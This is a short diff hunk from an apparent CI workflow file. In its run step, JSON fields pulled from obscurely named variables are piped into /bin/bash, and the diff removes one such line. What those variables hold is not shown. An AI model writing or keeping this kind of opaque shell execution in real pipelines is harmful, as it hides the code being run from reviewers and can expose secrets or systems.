@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
           echo $z923 | jq -r .l2 | /bin/bash
-          echo $slh323 | jq -r .b1 | /bin/bash
           printf '%s' "$o57" | jq -r .a81419 | /bin/bash
 
       - name: Store results
